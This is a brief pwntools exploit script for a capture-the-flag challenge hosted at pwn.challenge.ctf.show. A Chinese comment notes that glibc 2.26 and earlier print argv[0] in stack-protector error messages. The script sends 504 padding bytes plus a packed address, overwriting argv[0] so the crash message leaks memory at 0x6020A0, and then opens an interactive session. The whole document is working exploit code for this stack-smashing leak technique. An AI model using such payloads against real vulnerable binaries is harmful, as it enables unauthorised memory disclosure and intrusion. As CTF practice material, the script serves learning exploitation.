#glibc ≤ 2.26方存在打印错误信息时打印argv[0]
from pwn import *
#context(log_level='debug',arch='i386', os='linux')
context(log_level='debug',arch='amd64', os='linux')
p=remote("pwn.challenge.ctf.show",28192)
payload=b"a"*504+p64(0x6020A0)
p.sendline(payload)
p.interactive()